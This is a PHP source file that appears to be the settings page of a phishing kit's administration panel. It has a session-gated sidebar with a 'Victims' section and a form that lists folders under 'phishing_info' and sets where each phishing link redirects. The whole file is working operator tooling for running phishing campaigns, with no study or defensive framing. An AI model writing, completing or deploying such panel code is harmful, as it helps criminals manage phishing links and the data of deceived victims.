<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
?>

<?php
echo'<meta charset=UTF-8>';echo'<link rel=stylesheet type=text/css href=./style.css>';echo'<script>function aps(){document.getElementById("hello").contentWindow.location.reload();}</script>';$dir='.././sites';$efg=$_SERVER['REQUEST_URI'];$pat=explode('/',$efg);$cds=$_SERVER['SERVER_NAME'];for($i=0;$i<count($pat)- 2;$i++){$cds.=$pat[$i]."/";}$hgf="http://".$cds."sites/";

echo'
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  font-family: Courier New;
}

.sidebar {
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

.sidebar a {
  display: block;
  color: black;
  padding: 16px;
  text-decoration: none;
}
 
.sidebar a.active {
  background-color: #4CAF50;
  color: white;
}

.sidebar a:hover:not(.active) {
  background-color: #555;
  color: white;
}

div.content {
  margin-left: 200px;
  padding: 1px 16px;
  height: 1000px;
}

@media screen and (max-width: 700px) {
  .sidebar {
    width: 100%;
    height: auto;
    position: relative;
  }
  .sidebar a {float: left;}
  div.content {margin-left: 0;}
}

@media screen and (max-width: 400px) {
  .sidebar a {
    text-align: center;
    float: none;
  }
}
</style>
</head>
<body>

<div class="sidebar">
<br>
<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WELCOME</h3>
<br>

     <a href="../home.php"><b>Home</b></a>
  <a    href="../dashboard.php"><b>Links</b></a>
  <a   class="active" href="./index.php"><b>Settings</b></a>
  <a    href="../victims.php"><b>Victims</b</a>
  <a href="../logout.php"><b>Logout</b></a>
</div>';
if(!empty($_SERVER["HTTP_REFERER"])){$ref=$_SERVER["HTTP_REFERER"];if(substr_count($ref,"/admin/")== '1'){include 'meta_and_redirect_changer.php';$dir='../../phishing_info/';
echo '<meta name="viewport" content="width=device-width, initial-scale=1.0"><body style=background-color:black;><br><br><font style=font-family:Courier; color=white><center><h2 style=font-size:50px>Settings</h2><br><br><style>.bt{margin-bottom:5px;margin-left:40%;color:#fff;background-color:#FFF;font-size:90%;border:7px solid #000;width: 24%;height: 50px;}</style>';echo '<hr style=";height:5px;
border: 2px dashed #FFF;
";><br><center><form method=post action=./meta_and_redirect_changer.php><br><b style=font-family:Courier;>Settings for:&nbsp;&nbsp;</b><select name=selected style=width:325px; >';if(is_dir($dir)){if($dh=opendir($dir)){while(($file=readdir($dh))!==false){if($file!='..'){echo '<option value='.$file.'>'.$file.'</option>';}}closedir($dh);}}echo '</select><br><br><b style=font-family:Courier;>Redirect Phishing Link To:</b>
<input  style=background-color:#fff; size=40px type=url  placeholder=Redirect page name=redirect required><br><br>
<br><br><button style="background-color:#000;color:white;width:115px;height:60px;border:5px solid #FFF;font-size:15px;" type=submit ><b style="font-family:Courier New ;font-size:20px;" >Do it</b></button></form></center><br><hr style=";height:5px;
border: 2px dashed #FFF;
";><br><br><br><br></center></body>';
echo '</font>';}else{echo'<script>window.location.replace(".././dashboard.php");</script>';}}else{echo'<script>window.location.replace(".././dashboard.php");</script>';}

?>


